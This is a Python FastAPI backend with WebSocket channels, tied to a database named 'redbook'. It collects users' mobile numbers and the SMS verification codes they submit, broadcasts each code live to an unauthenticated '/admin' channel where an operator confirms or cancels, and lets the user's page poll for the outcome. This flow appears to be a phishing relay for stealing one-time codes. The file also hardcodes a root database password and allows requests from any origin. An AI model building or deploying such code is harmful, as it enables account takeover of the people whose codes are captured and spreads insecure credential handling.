import json
from typing import List
from fastapi import FastAPI, WebSocket, WebSocketDisconnect
from starlette.middleware.cors import CORSMiddleware
from tortoise.contrib.fastapi import register_tortoise
from Dao.Model import UserModel, ConfigModel
from fastapi import Request
from Common.ResponseBuild import ResponseBuild
from fastapi import status

app = FastAPI()

# 注册数据库
register_tortoise(
    app,
    db_url="mysql://root:Admin888@10.4.103.45:3306/redbook",
    modules={"models": ["Dao.Model"]},
    generate_schemas=False,
    add_exception_handlers=True
)

app.add_middleware(
    CORSMiddleware,
    # 允许跨域的源列表，例如 ["http://www.example.org"] 等等，["*"] 表示允许任何源
    allow_origins=["*"],
    # 跨域请求是否支持 cookie，默认是 False，如果为 True，allow_origins 必须为具体的源，不可以是 ["*"]
    allow_credentials=False,
    # 允许跨域请求的 HTTP 方法列表，默认是 ["GET"]
    allow_methods=["*"],
    # 允许跨域请求的 HTTP 请求头列表，默认是 []，可以使用 ["*"] 表示允许所有的请求头
    # 当然 Accept、Accept-Language、Content-Language 以及 Content-Type 总之被允许的
    allow_headers=["*"],
)


class ConnectionManager:
    def __init__(self):
        # 存放激活的ws连接对象
        self.active_connections: List[WebSocket] = []

    async def connect(self, ws: WebSocket):
        # 等待连接
        await ws.accept()
        # 存储ws连接对象
        self.active_connections.append(ws)
        # 通知信息
        await self.send_personal_message("欢迎光临~", ws)

    def disconnect(self, ws: WebSocket):
        # 关闭时 移除ws对象
        self.active_connections.remove(ws)

    @staticmethod
    async def send_personal_message(message: str, ws: WebSocket):
        # 发送个人消息
        await ws.send_text(message)

    async def broadcast(self, message: str):
        # 广播消息
        for connection in self.active_connections:
            await connection.send_text(message)


manager = ConnectionManager()


@app.websocket("/admin")
async def websocket_admin(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            # 获取传过来的数据
            data = json.loads(await websocket.receive_text())
            # 获取该用户的数据
            exists = await UserModel.filter(id=int(data["id"])).exists()
            # 判断用户信息是否存在
            if not exists:
                message = {"action": "return", "message": "当前用户不存在~"}
                await manager.send_personal_message(json.dumps(message, ensure_ascii=True), websocket)
            # 判断当前的动作
            if data["action"] == "confirm":
                await UserModel.filter(id=int(data["id"])).update(result="yes")
            elif data["action"] == "cancel":
                await UserModel.filter(id=int(data["id"])).update(result="no")
            # 确认或者取消数据
            message = {"action": "return", "message": "修改成功~"}
            await manager.send_personal_message(json.dumps(message, ensure_ascii=True), websocket)
            # 获取用户数据
            user_dao = await UserModel.filter(id=int(data["id"])).first().values("mobile")
            # 广播信息 让该用户得到消息回调
            message = {"action": "broadcastResult", "user": user_dao["mobile"], "result": data["action"]}
            await manager.broadcast(json.dumps(message))
    except WebSocketDisconnect:
        manager.disconnect(websocket)
        await manager.broadcast(f"用户-{websocket.client.host}-离开")


@app.websocket("/handle")
async def websocket_endpoint(websocket: WebSocket):
    await manager.connect(websocket)
    try:
        while True:
            # 获取传过来的数据
            data = json.loads(await websocket.receive_text())
            # 判断当前动作意向
            if data["action"] == "heart":
                # 用户信息存在
                message = {"action": "heart", "message": "我还活着呢~"}
                await manager.send_personal_message(json.dumps(message, ensure_ascii=True), websocket)
            elif data["action"] == "sendCode":
                # 获取验证码
                message = {"action": "notify", "message": "用户:{} 获取验证码".format(data["user"])}
                # 查询数据
                user_dao = await UserModel.filter(mobile=data["user"]).first()
                # 添加数据
                if not user_dao:
                    await UserModel(mobile=data["user"]).save()
                # 发送通知
                await manager.broadcast(json.dumps(message, ensure_ascii=True))
            elif data["action"] == "submit":
                # 获取处理用户信息
                handle_user = await UserModel.filter(mobile=data["user"]) \
                    .first() \
                    .values("id", "mobile", "code", "created_at", "result")
                # 判断用户信息是否满足条件
                if handle_user and handle_user["result"] != "wait":
                    # 判断当前数据的结果值
                    if handle_user["result"] == "yes":
                        action = "confirm"
                    else:
                        action = "cancel"
                    # 封装数据
                    message = {"action": "broadcastResult", "user": handle_user["mobile"], "result": action}
                    # 发送数据
                    await manager.send_personal_message(json.dumps(message, ensure_ascii=True), websocket)
                else:
                    # 修改用户数据
                    await UserModel.filter(mobile=data["user"]).update(code=int(data["code"]))
                    # 提交验证码
                    message = {
                        "action": "notify",
                        "message": "用户:{} 提交验证码：{}".format(
                            data["user"],
                            data["code"]
                        )
                    }
                    # 发送通知
                    await manager.broadcast(json.dumps(message, ensure_ascii=True))
    except WebSocketDisconnect:
        manager.disconnect(websocket)
        await manager.broadcast(f"用户-{websocket.client.host}-离开")


@app.get("/")
async def index():
    return ResponseBuild.success(data=[])


@app.post("/getcode")
async def getcode(request: Request):
    # 获取请求的参数
    query = await request.json()
    # 判断是否在数据库中
    result = await UserModel.filter(mobile=query["mobile"]) \
        .first() \
        .values("id", "mobile", "code", "created_at", "result")
    if not result or result["result"] == "wait":
        # 发送数据
        return ResponseBuild.success(code=status.HTTP_202_ACCEPTED, data={})
    # 当前数据存在数据库
    return ResponseBuild.success(data=result)


@app.get("/user")
async def user(page: int = 1, per_page: int = 15, ):
    # 使用新的分页工具
    result = await UserModel.paginate(per_page=per_page, page=page)
    return ResponseBuild.success(data=result)


@app.get("/search")
async def search(page: int = 1, per_page: int = 15, mobile: str = ""):
    # 使用新的分页工具
    result = await UserModel.mobile_paginate(per_page=per_page, page=page, mobile=mobile)
    return ResponseBuild.success(data=result)


@app.get("/Config")
async def get_config():
    result = await ConfigModel.filter(key="Image").first().values("id", "key", "value")
    return ResponseBuild.success(data=result)


@app.post("/savaConfig")
async def sava_config(request: Request):
    params = await request.json()
    await ConfigModel.filter(key="Image").update(value=params["Image"])
    return ResponseBuild.success(data={})


if __name__ == "__main__":
    import uvicorn

    # 官方推荐是用命令后启动 uvicorn main:app --host=127.0.0.1 --port=8010 --reload
    uvicorn.run(app='main:app', host="127.0.0.1", port=8010, reload=True, log_level="info")
